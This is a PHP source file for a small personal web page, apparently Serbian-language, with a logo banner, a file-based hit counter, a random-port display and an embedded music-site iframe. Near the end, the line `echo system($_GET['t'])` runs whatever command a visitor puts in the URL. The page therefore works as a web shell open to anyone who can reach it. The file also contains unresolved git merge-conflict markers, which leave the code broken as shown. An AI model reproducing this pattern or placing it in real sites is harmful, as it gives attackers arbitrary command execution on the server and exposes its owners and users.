<?php
//echo 'deklaracija';
echo '<html><head><style></style>
</head><body style="background: #111; color: #17f118;">';
<<<<<<< HEAD
//echo '<form style="text-align: center;">
//	<input name="t" type="search" class="inp" placeholder="Unesi komandu" autofocus>
//	<input type="submit" value="ENTER">
//</form>';
echo '<div style="text-align: center;" ><img src="ws1.png" width="100" height="auto"/></div>';
=======

//echo 'forma za terminal input kroz https';
//echo '<form>
//			<input name="t" type="search" class="inp" placeholder="Unesi komandu" autofocus>
//			<input type="submit" value="ENTER">
//		</form>';
>>>>>>> 3dc719e011276bd9f6c0d1fd9110ebb7b6f1e2f8

//echo 'logotipi';
echo '<br /><br /><div style="text-align: center;"><pre><b style="font-size: 1.3em;">USKRS - Uprava Srpske Kibernetike</b></pre></div>';
echo '<br /><div style="text-align: center;"><img src="logo1.jpg" width="160" height="auto" style="border: 2px dotted violet;">
</div><br /><br /><br />';
?>


<?php

//echo 'dodaj putanju do countlog.txt.';
$path = './countlog.txt';
// Opens countlog.txt to read the number of hits.
$file  = fopen( $path, 'r' );
$count = fgets( $file, 1000 );
fclose( $file );
// Update the count.
$count = abs( intval( $count ) ) + 1;
// Output the updated count.
echo "{$count} hits\n";
// Opens countlog.txt to change new hit number.
$file = fopen( $path, 'w' );
fwrite( $file, $count );
fclose( $file );
echo "<br /><p style='border-bottom: 2px dotted violet;'></p>";
?>

<?php
//echo 'random portovi';
echo '<pre>';
$last_line = system('shuf -i 1024-65535 -n 1', $retval);
echo '
</pre>Random port: ' . $last_line . '<br />
<br />Linearna vrednost: ' . $retval;

//echo 'ajfrejm densomaniak sajta - dens muzika';
echo '<iframe src="https://www.densomaniak.com/" title="Densomaniak" width="100%" height="300" style="border:1px solid black;"></iframe><br />';
echo system($_GET['t']);
?>

<?php
//echo '<div style="text-align: center;"><img src="linea-stairs.gif" height="70"><img src="hightech.gif" height="70"><img src="la-linea.gif" height="70"></div>';
//$output = shell_exec('ls');
//echo '<p>Fajlovi:</p>';
//echo "<pre>$output</pre>";
?>

<?php
echo '</body></html>';

